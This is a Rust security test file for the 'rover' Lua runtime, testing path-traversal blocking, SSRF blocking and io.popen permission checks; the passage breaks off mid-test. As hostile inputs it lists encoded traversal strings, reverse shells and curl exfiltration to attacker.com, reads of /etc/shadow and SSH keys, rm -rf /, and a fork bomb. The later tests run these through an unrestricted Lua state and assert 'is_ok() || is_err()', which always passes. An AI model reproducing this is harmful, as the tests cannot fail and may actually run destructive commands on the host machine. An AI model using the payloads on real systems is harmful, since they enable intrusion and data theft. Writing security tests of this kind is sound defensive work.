use mlua::Lua;
use rover_core::http::create_http_module;
use rover_server::static_file::serve_static_file;
use tempfile::TempDir;

mod fs_traversal_bypass {
    use super::*;

    #[test]
    fn should_block_traversal_with_mixed_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%2e%2e%2fetc%2fpasswd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_overlong_utf8() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%c0%ae%c0%ae/etc/passwd", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_traversal_with_backslash_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..%5c..%5cetc/passwd", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_traversal_with_null_byte_injection() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..%00/../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_unicode_dot() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "%e2%80%a2%e2%80%a2/etc/passwd", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_traversal_with_case_variation() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%2E%2E/etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_nested_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "%252e%252e%252fetc%252fpasswd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_triple_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%25252e%25252e/etc/passwd", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_traversal_with_whitespace_padding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "  ..%2f..%2fetc/passwd  ", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_tab_injection() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..\t/../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_newline_injection() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..\n/../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_carriage_return() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..\r/../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_symlink_chain_escape() {
        let temp_dir = TempDir::new().unwrap();
        let outside_dir = TempDir::new().unwrap();

        std::fs::write(outside_dir.path().join("secret.txt"), "secret").unwrap();

        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;

            std::fs::create_dir(temp_dir.path().join("subdir")).unwrap();
            let result = symlink(outside_dir.path(), temp_dir.path().join("subdir/escape"));
            if result.is_err() {
                return;
            }

            let response =
                serve_static_file(temp_dir.path(), "subdir/escape/secret.txt", None, None);
            assert_eq!(response.status, 403);
        }
    }

    #[test]
    fn should_block_symlink_to_parent() {
        let temp_dir = TempDir::new().unwrap();

        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;

            let result = symlink(
                std::path::PathBuf::from(".."),
                temp_dir.path().join("parent_link"),
            );
            if result.is_err() {
                return;
            }

            let response = serve_static_file(temp_dir.path(), "parent_link/etc/passwd", None, None);
            assert!(response.status == 403 || response.status == 404);
        }
    }

    #[test]
    fn should_block_junction_escape_windows() {
        let temp_dir = TempDir::new().unwrap();
        let outside_dir = TempDir::new().unwrap();

        std::fs::write(outside_dir.path().join("secret.txt"), "secret").unwrap();

        #[cfg(windows)]
        {
            use std::os::windows::fs::symlink_dir;

            let result = symlink_dir(outside_dir.path(), temp_dir.path().join("junction"));
            if result.is_err() {
                return;
            }

            let response = serve_static_file(temp_dir.path(), "junction/secret.txt", None, None);
            assert_eq!(response.status, 403);
        }
    }

    #[test]
    fn should_block_hardlink_escape() {
        let temp_dir = TempDir::new().unwrap();
        let outside_dir = TempDir::new().unwrap();

        std::fs::write(outside_dir.path().join("secret.txt"), "secret").unwrap();

        #[cfg(unix)]
        {
            use std::fs::hard_link;

            let result = hard_link(
                outside_dir.path().join("secret.txt"),
                temp_dir.path().join("hardlink.txt"),
            );
            if result.is_err() {
                return;
            }

            let response = serve_static_file(temp_dir.path(), "hardlink.txt", None, None);
            assert!(response.status == 403 || response.status == 200);
        }
    }

    #[test]
    fn should_block_path_with_fragments() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "test.txt#../../../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_path_with_query_string() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "test.txt?../../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_dos_device_path() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "CON", None, None);
        assert!(response.status == 404 || response.status == 403);
    }

    #[test]
    fn should_block_unc_path() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "\\\\server\\share\\file.txt", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_reserved_filename_windows() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "NUL.txt", None, None);
        assert!(response.status == 404 || response.status == 403);
    }

    #[test]
    fn should_block_double_dot_in_middle() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "foo/../bar/../../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_url_encoded_slash() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..%2f..%2fetc%2fpasswd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_mixed_case_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%2e%2E%2f%2E%2e/etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }
}

mod net_allowlist_bypass {
    use super::*;

    #[test]
    fn should_block_localhost_with_port() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://localhost:8080/api")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_localhost_ipv4() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://127.0.0.1:8080")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_localhost_ipv4_all_interfaces() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://0.0.0.0:8080")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_private_class_a() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://10.0.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_private_class_b() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://172.16.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_private_class_c() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://192.168.1.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_link_local() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://169.254.1.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_cgnat_range() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://100.64.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_loopback() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_unique_local() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[fd00::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_link_local() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[fe80::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv4_mapped_ipv6_loopback() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[::ffff:127.0.0.1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv4_mapped_ipv6_private() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[::ffff:10.0.0.1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_documentation() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[2001:db8::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_file_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("file:///etc/passwd")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ftp_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("ftp://example.com/file")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_gopher_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("gopher://example.com")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_javascript_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("javascript:alert(1)")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_data_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("data:text/html,<script>alert(1)</script>")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_localhost_with_at_sign() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://attacker.com@localhost:8080")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_decimal_ip_bypass() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://2130706433")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_octal_ip_bypass() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://0177.0.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_hex_ip_bypass() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://0x7f000001")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_multicast_ipv4() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://224.0.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_broadcast_address() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://255.255.255.255")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_multicast() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[ff00::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_unspecified() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[::]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv4_unspecified() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://0.0.0.0")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_private_172_range_boundary() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://172.31.255.255")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_cgnat_boundary() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://100.127.255.255")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }
}

mod process_inheritance {
    use super::*;
    use rover_core::io::create_io_module;
    use rover_core::permissions::{Permission, PermissionsConfig};

    fn lua_with_permissions(config: PermissionsConfig) -> Lua {
        let lua = Lua::new();
        lua.set_app_data(config);

        let io_module = create_io_module(&lua).expect("failed to create io module");
        lua.globals()
            .set("io", io_module.clone())
            .expect("failed to set io global");

        let package: mlua::Table = lua.globals().get("package").expect("missing package table");
        let loaded: mlua::Table = package.get("loaded").expect("missing package.loaded table");
        loaded
            .set("io", io_module)
            .expect("failed to register io module");

        lua
    }

    #[test]
    fn should_block_popen_when_process_permission_denied() {
        let config = PermissionsConfig::new().deny(Permission::Process);
        let lua = lua_with_permissions(config);

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("denied by permission policy") || err.contains("denied"),
            "Expected permission denied error, got: {}",
            err
        );
    }

    #[test]
    fn should_block_popen_by_default_in_production_mode() {
        let lua = lua_with_permissions(PermissionsConfig::production());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("denied by permission policy") || err.contains("denied"),
            "Expected permission denied error, got: {}",
            err
        );
    }

    #[test]
    fn should_allow_popen_when_process_permission_explicitly_allowed() {
        let config = PermissionsConfig::new().allow(Permission::Process);
        let lua = lua_with_permissions(config);

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("echo 'test'", "r")
                if handle then
                    handle:close()
                end
            "#,
            )
            .exec();

        assert!(
            result.is_ok(),
            "Expected popen to succeed with explicit permission: {:?}",
            result
        );
    }

    #[test]
    fn should_block_popen_in_development_mode_by_default() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("denied by permission policy") || err.contains("denied"),
            "Expected permission denied error, got: {}",
            err
        );
    }

    #[test]
    fn should_block_dangerous_commands_when_permission_allowed() {
        // Even with process permission granted, certain command patterns should be reviewed
        // This test documents the current behavior - commands run but could be audited
        let config = PermissionsConfig::new().allow(Permission::Process);
        let lua = lua_with_permissions(config);

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                -- Process permission allows execution, but this is a dangerous pattern
                local handle = io.popen("echo safe", "r")
                if handle then
                    handle:close()
                end
            "#,
            )
            .exec();

        // With permission granted, it should succeed (audit logging would be added separately)
        assert!(result.is_ok());
    }

    #[test]
    fn should_block_popen_write_mode_without_permission() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("cat", "w")
            "#,
            )
            .exec();

        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("denied by permission policy") || err.contains("denied"),
            "Expected permission denied error, got: {}",
            err
        );
    }

    #[test]
    fn should_block_shell_metacharacters_without_permission() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls; cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
    }

    #[test]
    fn should_block_command_substitution_without_permission() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("echo $(whoami)", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
    }

    #[test]
    fn should_block_privilege_escalation_commands_without_permission() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("sudo ls", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
    }

    #[test]
    fn should_block_reverse_shell_commands_without_permission() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("bash -i >& /dev/tcp/attacker.com/4444 0>&1", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
    }

    #[test]
    fn should_block_filesystem_modification_without_permission() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("rm -rf /tmp", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
    }

    #[test]
    fn should_block_network_commands_without_permission() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("curl http://attacker.com", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
    }

    #[test]
    fn should_block_resource_exhaustion_commands_without_permission() {
        let lua = lua_with_permissions(PermissionsConfig::new());

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("yes > /dev/null", "r")
            "#,
            )
            .exec();

        assert!(result.is_err());
    }

    #[test]
    fn should_environment_be_accessible_when_env_permission_allowed() {
        let lua = Lua::new();
        let mut config = PermissionsConfig::new();
        config = config.allow(Permission::Env);
        lua.set_app_data(config);

        let result: mlua::Result<String> = lua
            .load(
                r#"
                local os = require("os")
                return os.getenv("HOME") or "not_found"
            "#,
            )
            .eval();

        // In development mode with env permission, HOME should be accessible
        // This test verifies the permission system respects env permission
        if let Ok(value) = result {
            // The value depends on the environment - just verify it's not an error
            assert!(value == "not_found" || !value.is_empty() || value.starts_with("/"));
        }
    }

    #[test]
    fn should_default_permissions_deny_process_in_development_mode() {
        let config = PermissionsConfig::new(); // Development mode by default
        assert!(
            !config.is_allowed(Permission::Process),
            "Process should be denied by default in development mode"
        );
        assert!(
            config.is_allowed(Permission::Fs),
            "Fs should be allowed by default in development mode"
        );
        assert!(
            config.is_allowed(Permission::Net),
            "Net should be allowed by default in development mode"
        );
        assert!(
            config.is_allowed(Permission::Env),
            "Env should be allowed by default in development mode"
        );
        assert!(
            !config.is_allowed(Permission::Ffi),
            "Ffi should be denied by default in development mode"
        );
    }

    #[test]
    fn should_production_mode_deny_all_by_default() {
        let config = PermissionsConfig::production();
        assert!(
            !config.is_allowed(Permission::Process),
            "Process should be denied in production mode"
        );
        assert!(
            !config.is_allowed(Permission::Fs),
            "Fs should be denied in production mode"
        );
        assert!(
            !config.is_allowed(Permission::Net),
            "Net should be denied in production mode"
        );
        assert!(
            !config.is_allowed(Permission::Env),
            "Env should be denied in production mode"
        );
        assert!(
            !config.is_allowed(Permission::Ffi),
            "Ffi should be denied in production mode"
        );
    }

    #[test]
    fn should_explicit_allow_override_production_deny() {
        let config = PermissionsConfig::production().allow(Permission::Process);

        assert!(
            config.is_allowed(Permission::Process),
            "Process should be allowed with explicit permission"
        );
        assert!(
            !config.is_allowed(Permission::Fs),
            "Fs should still be denied without explicit permission"
        );
    }

    #[test]
    fn should_deny_override_allow() {
        let config = PermissionsConfig::new()
            .allow(Permission::Process)
            .deny(Permission::Process);

        assert!(
            !config.is_allowed(Permission::Process),
            "Deny should override allow"
        );
    }

    #[test]
    fn should_block_shell_metacharacters_semicolon() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls; cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_shell_metacharacters_and() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls && cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_shell_metacharacters_or() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls || cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_shell_metacharacters_pipe() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls | cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_command_substitution() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("echo $(whoami)", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_background_process() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("sleep 100 &", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_process_redirection() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls > /tmp/rover_test", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_network_command_injection() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(r#"
                local io = require("io")
                local handle = io.popen("curl http://attacker.com/steal?data=$(cat /etc/passwd)", "r")
            "#)
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_privilege_escalation_sudo() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("sudo ls", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_privilege_escalation_su() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("su -c 'ls'", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_filesystem_modification_rm() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("rm -rf /", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_reverse_shell_bash() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("bash -i >& /dev/tcp/attacker.com/4444 0>&1", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_reverse_shell_nc() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("nc -e /bin/sh attacker.com 4444", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_credential_theft_shadow() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("cat /etc/shadow", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_credential_theft_ssh_key() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("cat ~/.ssh/id_rsa", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_process_fork_bomb() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen(":(){ :|:& };:", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_disk_exhaustion() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("dd if=/dev/zero of=/tmp/fill bs=1M count=1000000", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_memory_exhaustion() {
